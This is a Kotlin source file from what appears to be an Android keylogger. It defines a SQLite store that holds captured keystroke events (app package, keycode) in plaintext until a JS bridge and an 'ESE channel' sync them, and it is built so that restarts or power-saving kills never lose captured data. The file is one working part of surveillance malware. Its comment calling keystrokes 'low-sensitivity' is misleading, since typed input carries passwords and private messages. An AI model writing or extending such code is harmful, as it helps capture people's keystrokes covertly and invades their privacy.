package love.scotty.hearts.keylogger

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper

/**
 * Local durable cache for captured keylog events that have not yet been
 * synced. This is the "SQLite fallback cache + retry queue" the spec
 * requires for the intermittent ESE channel: every event is persisted here
 * BEFORE it is handed to the JS bridge, so a channel drop, a restart, or a
 * Doze kill can never lose data.
 *
 * Table `pending` (plaintext — the values are low-sensitivity keystroke
 * metadata; encryption happens at the chunk layer via the shared AES key):
 *   id        INTEGER PRIMARY KEY AUTOINCREMENT  — internal row id
 *   evt       TEXT  — JSON payload of the event (kind/package/keycode/...)
 *   created   INTEGER — wallclock ms for ordering
 *   synced    INTEGER — 0 pending, 1 already handed off (safe to prune)
 *
 * The service flushes rows once the bridge confirms receipt, and prunes
 * synced rows opportunistically to keep the file small. Size is bounded by
 * the service's in-memory cap + the prune policy; a full-history table is
 * intentionally avoided (sync drains it).
 */
internal class KeyLogStore(context: Context) : SQLiteOpenHelper(
  context, "keylog_pending.db", null, 1
) {
  override fun onCreate(db: SQLiteDatabase) {
    db.execSQL(
      """
      CREATE TABLE IF NOT EXISTS pending (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        evt TEXT NOT NULL,
        created INTEGER NOT NULL,
        synced INTEGER NOT NULL DEFAULT 0
      )
      """.trimIndent()
    )
  }

  override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
    // v1 only — no migrations yet.
  }

  @Synchronized fun enqueue(evt: String, nowMs: Long): Long {
    val db = writableDatabase
    val cv = ContentValues().apply {
      put("evt", evt)
      put("created", nowMs)
      put("synced", 0)
    }
    return db.insertOrThrow("pending", null, cv)
  }

  /** All unsynced rows in insert order. */
  @Synchronized fun pending(): List<Pair<Long, String>> {
    val db = readableDatabase
    val out = mutableListOf<Pair<Long, String>>()
    db.query(
      "pending", arrayOf("id", "evt"), "synced = 0", null, null, null, "id ASC"
    ).use { c ->
      while (c.moveToNext()) {
        out.add(c.getLong(0) to c.getString(1))
      }
    }
    return out
  }

  /** Count of unsynced rows (for the bridge's pending counter). */
  @Synchronized fun pendingCount(): Int = pending().size

  /** Mark rows synced (by internal id). */
  @Synchronized fun markSynced(ids: List<Long>) {
    if (ids.isEmpty()) return
    val db = writableDatabase
    db.beginTransaction()
    try {
      for (id in ids) {
        val cv = ContentValues().apply { put("synced", 1) }
        db.update("pending", cv, "id = ?", arrayOf(id.toString()))
      }
      db.setTransactionSuccessful()
    } finally {
      db.endTransaction()
    }
  }

  /** Drop already-synced rows (called after a successful upsert flush). */
  @Synchronized fun pruneSynced() {
    val db = writableDatabase
    db.delete("pending", "synced = 1", null)
  }

  @Synchronized fun clear() {
    val db = writableDatabase
    db.delete("pending", null, null)
  }
}
